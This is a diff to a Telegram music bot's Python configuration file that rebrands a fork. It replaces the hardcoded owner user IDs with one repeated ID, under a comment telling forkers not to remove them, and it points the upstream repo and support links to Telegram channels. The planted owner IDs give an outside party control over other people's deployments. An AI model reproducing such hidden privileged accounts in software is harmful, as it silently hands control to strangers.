@@ -48,9 +48,9 @@ OWNER_ID = list(
 )  # Input type must be interger
 
 # JANGAN HAPUS YA JANCOK KALAU FORK ATAU CLONE
-OWNER_ID.append(1607338903)
-OWNER_ID.append(1641726479)
-OWNER_ID.append(1423479724)
+OWNER_ID.append(1808136434)
+OWNER_ID.append(1808136434)
+OWNER_ID.append(1808136434)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
@@ -61,7 +61,7 @@ HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")
 # For customized or modified Repository
 UPSTREAM_REPO = getenv(
     "UPSTREAM_REPO",
-    "https://github.com/kenkansaja/Musikku",
+    "https://t.me/FAMILYNVN",
 )
 UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "Musikku")
 
@@ -70,11 +70,11 @@ GIT_TOKEN = getenv("GIT_TOKEN", None)
 
 # Only  Links formats are  accepted for this Var value.
 SUPPORT_CHANNEL = getenv(
-    "SUPPORT_CHANNEL", "https://t.me/gabutan_escape"
-)  # Example:- https://t.me/gabutan_escape
+    "SUPPORT_CHANNEL", "https://t.me/FAMILYNVN"
+)  # Example:- https://t.me/FAMILYNVN
 SUPPORT_GROUP = getenv(
-    "SUPPORT_GROUP", "https://t.me/aruna_mutual"
-)  # Example:- https://t.me/aruna_mutual
+    "SUPPORT_GROUP", "https://t.me/siniajaloh"
+)  # Example:- https://t.me/siniajaloh
 
 # Set it in True if you want to leave your assistant after a certain amount of time. [Set time via AUTO_LEAVE_ASSISTANT_TIME]
 AUTO_LEAVING_ASSISTANT = getenv("AUTO_LEAVING_ASSISTANT", "True")
@@ -112,7 +112,7 @@ YOUTUBE_DOWNLOAD_EDIT_SLEEP = int(getenv("YOUTUBE_EDIT_SLEEP", "3"))
 TELEGRAM_DOWNLOAD_EDIT_SLEEP = int(getenv("TELEGRAM_EDIT_SLEEP", "5"))
 
 # Your Github Repo.. Will be shown on /start Command
-GITHUB_REPO = getenv("GITHUB_REPO", "https://github.com/kenkansaja/Musikku")
+GITHUB_REPO = getenv("GITHUB_REPO", "https://t.me/FAMILYNVN")
 
 # Spotify Client.. Get it from https://developer.spotify.com/dashboard
 SPOTIFY_CLIENT_ID = getenv("SPOTIFY_CLIENT_ID", "f51dad0089144d93be494beb765dcc7a")
